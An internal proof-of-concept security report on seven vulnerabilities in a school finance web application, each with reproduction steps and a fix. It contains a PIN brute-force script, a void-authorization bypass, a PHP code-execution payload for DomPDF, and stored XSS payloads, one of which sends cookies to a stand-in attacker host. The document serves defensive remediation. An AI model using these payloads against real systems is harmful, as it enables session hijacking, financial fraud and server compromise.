# FinanceV2 — Proof of Concept (POC) Document
### Demonstrating Critical Vulnerabilities Found in Code Review

**Date:** May 29, 2026  
**Prepared by:** Engineering Review Team  
**Classification:** Internal — Engineering & Security Team Only  
**Reference:** Full review in `FINANCEV2_CODE_REVIEW.md`

> ⚠️ **This document is for internal use only.** It demonstrates how identified vulnerabilities work so the development team can reproduce, understand, and fix them. Do not share externally.

---

## POC 1 — Plaintext PIN Exposure via Direct Database Read

**Vulnerability Reference:** Issue 2.2  
**Severity:** Critical

### How It Works

PINs used to authorize financial voids are inserted into the `chrng_pin` table without hashing:

```php
// PinAndAuthorizationController.php — save_new_pin()
$pinId = DB::table('chrng_pin')->insertGetId([
    'pin_code'     => $validated['new_pin'],  // ← stored as plain text
    'time_created' => $now->format('H:i:s'),
    'date_created' => $now->toDateString(),
]);
```

And verified by direct string match:

```php
// ViewAccountAdjustFees.php — verifyVoidPin()
$validPin = DB::table('chrng_pin')
    ->join('chrngpermission', 'chrng_pin.id', '=', 'chrngpermission.pin_id')
    ->where('chrng_pin.pin_code', $request->pin)   // ← plain text comparison
    ->where('chrngpermission.pin_status', 'active')
    ->first();
```

### To Reproduce

1. Log in as a Finance Admin
2. Assign a PIN to any cashier via the Home > PIN Management screen
3. Open a database client (e.g., phpMyAdmin, TablePlus, or MySQL CLI)
4. Run: `SELECT pin_code FROM chrng_pin;`
5. **Expected result:** All PINs are visible in plain text

### Impact

Any user with read access to the database — including DBAs, hosting staff, or anyone exploiting a separate SQL vulnerability — can read all PINs and use them to authorize financial reversals or void operations on behalf of any cashier.

### Fix

```php
// On save:
'pin_code' => \Illuminate\Support\Facades\Hash::make($validated['new_pin']),

// On verify:
// First fetch the record, then check with Hash::check()
$pinRecord = DB::table('chrng_pin')
    ->join('chrngpermission', 'chrng_pin.id', '=', 'chrngpermission.pin_id')
    ->where('chrngpermission.userid', $currentUserId)
    ->where('chrngpermission.pin_status', 'active')
    ->where('chrngpermission.status_id', 2)
    ->first();

if (!$pinRecord || !\Hash::check($request->pin, $pinRecord->pin_code)) {
    return response()->json(['success' => false, 'message' => 'Invalid PIN'], 401);
}
```

---

## POC 2 — Void Authorization Bypass (No Auth Check on Actual Void Endpoint)

**Vulnerability Reference:** Issue 2.4  
**Severity:** Critical

### How It Works

The frontend flow is:
1. User clicks "Void"
2. Frontend calls `GET /view-account/check-void-authorization` → shows PIN or credentials form
3. User submits PIN/credentials to `POST /view-account/verify-void-pin`
4. **If verified,** frontend calls `POST /view-account/adjustment/{id}/void`

Step 4 is the critical gap. The `voidAdjustment()` method — the one that actually performs the void — **does not verify that steps 2 and 3 were completed**:

```php
// ViewAccountAdjustFees.php — voidAdjustment($id)
public function voidAdjustment($id)
{
    $adjustment = DB::table('adjustments')->where('id', $id)->where('deleted', 0)->first();

    if (!$adjustment) {
        return response()->json(['message' => 'Adjustment not found'], 404);
    }

    if ($adjustment->adjstatus === 'VOIDED') {
        return response()->json(['message' => 'This adjustment is already voided.'], 400);
    }

    // ← NO authorization check here. Executes immediately.
    DB::transaction(function () use ($adjustment) {
        DB::table('adjustments')->where('id', $adjustment->id)->update([
            'adjstatus' => 'VOIDED',
            // ...
        ]);
    });
    return response()->json(['message' => 'Adjustment voided successfully.']);
}
```

### To Reproduce

1. Log in as any authenticated finance user (does **not** need Finance Admin role)
2. Open your browser's developer tools → Network tab
3. Navigate to any student's View Account page and note an adjustment ID from the page's network calls
4. In the browser console or via a tool like Postman, send:
   ```
   POST /view-account/adjustment/{id}/void
   ```
   with the session cookie from your browser
5. **Expected result:** The adjustment is voided. No PIN was entered. No credentials were checked.

### Impact

Any authenticated user with access to the FinanceV2 module can void any financial adjustment for any student by sending a direct API request, bypassing the entire PIN/credentials authorization UI.

### Fix

Issue a short-lived signed token from the verify endpoints. Require it on the void endpoint:

```php
// In verifyVoidPin() / verifyVoidCredentials() — after successful verification:
$token = \Illuminate\Support\Str::random(64);
Cache::put("void_auth_{$currentUserId}", $token, now()->addMinutes(5));
return response()->json(['success' => true, 'void_token' => $token]);

// In voidAdjustment():
$request->validate(['void_token' => 'required|string']);
$expected = Cache::get("void_auth_" . Auth::id());
if (!$expected || !hash_equals($expected, $request->void_token)) {
    Log::warning('void_token_mismatch', ['user' => Auth::id(), 'adjustment' => $id]);
    return response()->json(['message' => 'Authorization expired or invalid.'], 403);
}
Cache::forget("void_auth_" . Auth::id()); // Single use
```

---

## POC 3 — No Rate Limiting on PIN Brute-Force

**Vulnerability Reference:** Issue 2.3  
**Severity:** Critical

### How It Works

A 4-digit PIN has exactly 10,000 possible values (0000–9999). The PIN verification endpoint has no rate limiting, lockout, or delay:

```php
// Route — no throttle middleware:
Route::post('/view-account/verify-void-pin', 
    'Financev2Controller\Student\ViewAccount\ViewAccountAdjustFees@verifyVoidPin'
);

// Controller — no attempt counter, no lockout:
public function verifyVoidPin(Request $request)
{
    $request->validate(['pin' => 'required|string|min:4|max:6']);
    // ... direct DB check, returns 401 on failure, no counter incremented
}
```

### To Reproduce (Proof of Concept Script)

The following is a conceptual demonstration — do not run against production:

```python
# Conceptual POC — brute force 4-digit PIN
import requests

session_cookie = "YOUR_SESSION_COOKIE_HERE"
target_user_id = 42  # cashier whose PIN you want to find

for pin in range(0, 10000):
    padded = str(pin).zfill(4)
    response = requests.post(
        "https://your-school-system.com/view-account/verify-void-pin",
        json={"pin": padded},
        cookies={"laravel_session": session_cookie}
    )
    if response.json().get("success") == True:
        print(f"PIN FOUND: {padded}")
        break

# On a typical server, this completes in under 60 seconds.
```

### Impact

An authenticated user can discover any cashier's PIN in under 60 seconds. Combined with POC 2 (void bypass), this is largely theoretical, but if the void bypass is patched first without fixing rate limiting, the brute force becomes the next attack vector.

### Fix

```php
// routes/financev2.php
Route::post('/view-account/verify-void-pin', ...)->middleware(['auth', 'throttle:5,1']);
Route::post('/view-account/verify-void-credentials', ...)->middleware(['auth', 'throttle:5,1']);
```

Also log all failed attempts:
```php
Log::warning('pin_verification_failed', [
    'user_id'    => Auth::id(),
    'ip'         => $request->ip(),
    'attempt_at' => now(),
]);
```

---

## POC 4 — Student Financial Data Sent to External AI Service

**Vulnerability Reference:** Issue 2.9  
**Severity:** High

### How It Works

The AI assistant feature in `FinanceAiAssistantController.php` accepts page "context" from the frontend and forwards it to OpenRouter's free AI API:

```php
// FinanceAiAssistantController.php — analyze()
$context = trim((string) $request->input('context', ''));
// ...
$userPrompt = $prompt . "\n\nPage context:\n" . Str::limit($context, 8000, ' ...');

$response = $client->request('POST', 'chat/completions', [
    'headers' => $this->defaultHeaders(),
    'json' => [
        'model' => $model['id'],   // e.g. 'amazon/nova-2-lite-v1:free'
        'messages' => [
            ['role' => 'system', 'content' => $systemPrompt],
            ['role' => 'user',   'content' => $userPrompt],  // ← contains student data
        ],
    ],
]);
```

The `context` field is populated by the frontend from whatever is currently on the screen — which on the Student Accounts page includes student names, IDs, balances, and payment histories.

### To Reproduce

1. Log in to FinanceV2
2. Navigate to Student Accounts and load a list of students with financial data visible
3. Open browser DevTools → Network tab
4. Click the "AI Assistant" or analyze button
5. Intercept the `POST /finance-ai/analyze` request
6. Inspect the request body — the `context` field contains student names, IDs, and financial figures
7. That exact content is forwarded verbatim to `https://openrouter.ai/api/v1/chat/completions`

### Impact

Student financial records — a protected category of information under the Philippine Data Privacy Act and other regulations — are being transmitted to a third-party commercial AI service without a formal Data Processing Agreement, data residency guarantees, or user consent. OpenRouter's free tier models have no guaranteed data deletion policy.

### Fix (Immediate)

Add a sanitization step that strips all PII before sending:

```php
// Create a sanitizer before sending to AI
private function sanitizeContextForAI(string $context): string
{
    // Remove student IDs (common patterns: 8-digit numbers, SID format)
    $context = preg_replace('/\b\d{6,10}\b/', '[REDACTED-ID]', $context);
    // Remove peso amounts (preserve column labels, remove values)
    $context = preg_replace('/₱[\d,]+\.?\d*/', '₱[AMOUNT]', $context);
    $context = preg_replace('/\b\d{1,3}(,\d{3})*(\.\d{2})?\b/', '[AMOUNT]', $context);
    return $context;
}

// In analyze():
$userPrompt = $prompt . "\n\nPage context:\n" . Str::limit(
    $this->sanitizeContextForAI($context), 
    8000, 
    ' ...'
);
```

**Long-term fix:** Conduct a privacy impact assessment. Either self-host an LLM or obtain explicit consent and a DPA with the AI provider before processing any student data.

---

## POC 5 — Grand Total Report Performance Collapse

**Vulnerability Reference:** Issue 3.1  
**Severity:** Critical (Reliability)

### How It Works

`ArReportsController::getGrandTotals()` uses a `while` loop to paginate through all students, accumulating totals in PHP:

```php
$maxIterations = 500;      // 500 pages
$maxPerPage = 100;         // 100 students per page
// = up to 50,000 students processed one page at a time

while ($hasMorePages && $iterations < $maxIterations) {
    $iterations++;
    $allDataResponse = $studentController->getFilteredStudents($allDataRequest); // Full DB query each loop
    // ... sum totals
    $currentPage++;
}
```

Each call to `getFilteredStudents()` runs multiple JOIN queries internally. For 2,000 enrolled students across 20 iterations:

- ~20 paginated DB round-trips, each with 3–5 queries = ~60–100 queries total
- Each iteration waits for the previous to finish (synchronous)
- Typical execution time estimate: **30–120 seconds** depending on server load

PHP's default `max_execution_time` is 30 seconds.

### To Reproduce (Load Test)

```bash
# Using Apache Bench — simulate a single Accounts Receivable grand total request
# with a school year that has 2000+ enrolled students

ab -n 3 -c 1 \
  -H "Cookie: laravel_session=YOUR_SESSION_COOKIE" \
  "https://your-school-system.com/financev2/reports/ar/grand-totals?school_year=2&semester=1"

# Expected: requests timeout or return 504 Gateway Timeout
# Also monitor: server CPU and MySQL slow query log during this test
```

### Fix

Replace the PHP loop with a single SQL aggregate:

```php
public function getGrandTotals(Request $request)
{
    $syid     = $request->input('school_year');
    $semid    = $request->input('semester');

    // One query. Runs in milliseconds.
    $totals = DB::table('studledger')
        ->where('syid', $syid)
        ->where('deleted', 0)
        ->when($semid, fn($q) => $q->where('semid', $semid))
        ->selectRaw("
            SUM(CASE WHEN amount > 0 THEN amount ELSE 0 END)        AS total_payables,
            SUM(CASE WHEN amount < 0 THEN ABS(amount) ELSE 0 END)  AS total_payments,
            SUM(amount)                                             AS total_balance
        ")
        ->first();

    return response()->json([
        'success'     => true,
        'grandTotals' => [
            'payables'    => number_format($totals->total_payables ?? 0, 2, '.', ''),
            'payments'    => number_format($totals->total_payments ?? 0, 2, '.', ''),
            'receivables' => number_format($totals->total_balance  ?? 0, 2, '.', ''),
        ],
    ]);
}
```

---

## POC 6 — DomPDF PHP Execution Enabled

**Vulnerability Reference:** Issue 2.5  
**Severity:** High

### How It Works

```php
// ExportStudentAccountController.php
$pdf->getDomPDF()->set_option('isPhpEnabled', true);
```

When `isPhpEnabled` is `true`, DomPDF will execute any `<?php ?>` tags it finds in the HTML passed to it. If any piece of user-controlled data reaches a Blade template via `{!! $variable !!}` (unescaped output) and contains PHP code, it will be executed on the server.

### To Reproduce (Concept Only — Do Not Execute)

1. Find any input that flows into the `finance_v2.pages.student.exports.student-accounts-pdf` Blade template
2. If any field uses `{!! $student->fullname !!}` or similar unescaped output:
   - Insert the value `<?php system('id'); ?>` into a student's name field
   - Trigger a PDF export
   - The server executes `system('id')` during PDF rendering

### Current Risk Assessment

The risk is conditional on whether any unescaped `{!! !!}` output exists in the PDF template. Even if it does not exist today, `isPhpEnabled = true` is a latent vulnerability — any future developer adding `{!! !!}` for formatting purposes unknowingly creates an RCE.

### Fix

One line. No side effects for standard PDF templates:

```php
// ExportStudentAccountController.php
$pdf->getDomPDF()->set_option('isPhpEnabled', false);  // Change true → false
```

Audit the PDF Blade template at `finance_v2.pages.student.exports.student-accounts-pdf` and replace any `{!! !!}` with `{{ }}` for all user-sourced data.

---

## POC 7 — Stored XSS via Fee Particulars / Student Name / Lab Item Name

**Vulnerability Reference:** Issues 2.11, 2.12  
**Severity:** High

### How It Works

JavaScript in the Finance module builds HTML by concatenating server-returned database values without HTML-escaping, then inserts the result directly into the DOM. Three distinct surfaces are affected:

**Surface A: Adjustment & Payment History (`view-accounts-modal.blade.php`)**

```js
// item.particulars, ai.particulars, fee.particulars all inserted raw:
$adjTbody.append(`
    <small class="text-muted">${item.particulars}</small>
`);
paymentDetailsHtml += `<strong>${fee.particulars}:</strong>`;
$('#vaPaymentDetails').html(paymentDetailsHtml);
```

`item.particulars` comes from fee records in the database. Any Finance Admin who can create/edit school fees controls this value.

**Surface B: Student Name DataTable Column (`student-account.blade.php`)**

```js
nameHtml += '<div>' + row.fullname + '</div>';
return nameHtml; // DataTables renders as HTML
```

`row.fullname` is the student's registered name.

**Surface C: Lab Fee Subject Items (`laboratory_fees.blade.php`)**

```js
function formatLabItems(rowData) {
    itemsHtml += `<li>${item.item_name} - ₱...</li>`; // unescaped
    return itemsHtml; // inserted as HTML in DataTables child row
}
```

### To Reproduce (Surface A)

1. Log in as a Finance Admin.
2. Create or edit a school fee and set its `particulars` (fee name) to:
   ```
   Tuition<img src=x onerror="fetch('https://attacker.example/steal?s='+document.cookie)">
   ```
3. Save the fee record.
4. Wait for any Finance staff member to open the View Accounts modal for a student who has that fee.
5. When the Adjustments or Payments tab loads, the `<img>` tag is rendered and the `onerror` handler executes in the victim's browser.

### To Reproduce (Surface B)

1. Log into the student enrollment/registrar module.
2. Create or update a student whose name is:
   ```
   Juan<script>alert(document.cookie)</script>
   ```
3. Any Finance user who loads the Student Accounts page will trigger the script when DataTables renders the student list.

### Expected Result (Secure)
The text `<img...>` or `<script>` should appear as literal displayed text, not parsed HTML.

### Actual Result (Vulnerable)
The tag is injected into the DOM. JavaScript in the payload executes with full access to the Finance session, including:
- `document.cookie` (session cookie)
- `document.querySelector('meta[name="fv2-mask-key"]').content` (AES decryption key)
- Ability to make authenticated AJAX requests as the Finance staff victim

### Impact
Any of the following can be done silently without the Finance staff member's knowledge:
- Submit unauthorized adjustments or voids
- Capture PINs entered into the void authorization dialog
- Exfiltrate all financial data visible in the current session

### Fix

```js
function escapeHtml(str) {
    return String(str || '')
        .replace(/&/g, '&amp;').replace(/</g, '&lt;')
        .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

// Apply to every server-derived value before HTML concatenation
$adjTbody.append(`<small>${escapeHtml(item.particulars)}</small>`);
nameHtml += '<div>' + escapeHtml(row.fullname) + '</div>';
itemsHtml += `<li>${escapeHtml(item.item_name)} - ₱...</li>`;
```

---

## Summary Table

| POC | Vulnerability | Auth Required to Exploit? | Complexity | Confirmed? |
|---|---|---|---|---|
| POC 1 | Plaintext PINs | Yes (DB access) | Low | ✅ Code-confirmed |
| POC 2 | Void bypass (no auth check) | Yes (any auth user) | Low | ✅ Code-confirmed |
| POC 3 | PIN brute-force | Yes (any auth user) | Low | ✅ Code-confirmed |
| POC 4 | PII sent to external AI | Yes (any auth user) | Low | ✅ Code-confirmed |
| POC 5 | Report timeout/crash | Yes (any auth user) | Low | ✅ Code-confirmed |
| POC 6 | DomPDF RCE potential | Conditional | Medium | ⚠️ Latent (setting is on) |
| POC 7 | Stored XSS via fee/student/item names | Yes (Finance Admin or Registrar) | Low | ✅ Code-confirmed |

---

## Fix Priority Order for Engineering

| Order | POC | Estimated Fix Time | Risk if Deferred |
|---|---|---|---|
| 1 | POC 6 — Turn off DomPDF PHP execution | 5 minutes | RCE on any future template edit |
| 2 | POC 4 — Strip PII before AI calls | 2 hours | Active privacy violation |
| 3 | POC 7 — Apply escapeHtml() to particulars, fullname, item_name | 2–4 hours | Session hijack / PIN theft on fee/student edit |
| 4 | POC 2 — Add void token to voidAdjustment() | 4–6 hours | Active auth bypass |
| 5 | POC 3 — Add throttle middleware to PIN routes | 30 minutes | Brute-force ready |
| 6 | POC 1 — Hash PINs with bcrypt | 1 day (data migration needed) | DB breach = all PINs exposed |
| 7 | POC 5 — Replace grand total loop with SQL aggregate | 2–3 hours | System crash during peak usage |

---

